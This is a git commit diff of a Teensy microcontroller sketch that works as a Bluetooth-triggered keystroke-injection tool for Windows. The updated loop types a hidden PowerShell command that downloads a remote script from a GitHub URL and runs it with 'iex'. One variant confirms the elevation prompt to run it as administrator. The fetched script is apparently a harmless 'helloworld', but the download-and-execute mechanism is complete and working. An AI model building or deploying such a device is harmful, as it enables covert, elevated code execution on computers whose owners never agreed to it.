df52044dd7703d1508013aa6863203d8eda0c750
Robert Barrett <barrybobbit@gmail.com>
2016-12-29 20:59:54 -0500

    Update senddata-teensy.ino

--- senddata-teensy.ino
+++ senddata-teensy.ino
@@ -1,30 +1,21 @@
-void winKey(){
+void runCmd(char cmdString[]){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.releaseAll();
   delay(100);
+  Keyboard.println(cmdString);
 }
 
-void runBox(){
+void runCmdAsAdmin(char cmdString[]){
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
   Keyboard.releaseAll();
   delay(100);
-}
-
-void openCmd(){
-  winKey();
-  Keyboard.println("cmd");
-  delay(100);
-}
-void openCmdAsAdmin(){
-  winKey();
-  Keyboard.print("cmd");
-  delay(300);
+  Keyboard.print(cmdString);
+  delay(1800);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_SHIFT);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(400);
+  delay(1000);
   Keyboard.press(KEY_LEFT_ARROW);
   Keyboard.releaseAll();
   Keyboard.press(KEY_RETURN);
@@ -33,16 +24,6 @@ void openCmdAsAdmin(){
 }
 
 
-void payload() {
-  winKey();
-  //Keyboard.println("powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
-  Keyboard.println("powershell.exe -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
-}
-
-void payload2() {
-  winKey();
-  Keyboard.println("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
-}
 
 void setup() {
   Serial3.begin (9600);
@@ -53,14 +34,16 @@ void loop() {
   if (Serial3.available ()) {  
     btRead = Serial3.read();
     if(btRead == '1'){
-       payload();
-       Serial3.print("\r\nPayload 1 sent\r\n");
+       runCmdAsAdmin("powershell -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
+       Serial3.println("\r\nPayload 1 sent");
     }
-    else if(btRead == '2'){
-       payload2();
+    if(btRead == '2'){
+       runCmd("powershell -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
        Serial3.print("\r\nPayload 2 sent\r\n");
     }
-
-    
+    else if(btRead == '3'){
+       runCmd("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
+       Serial3.print("\r\nPayload 3 sent\r\n");
+    }
   }
 }
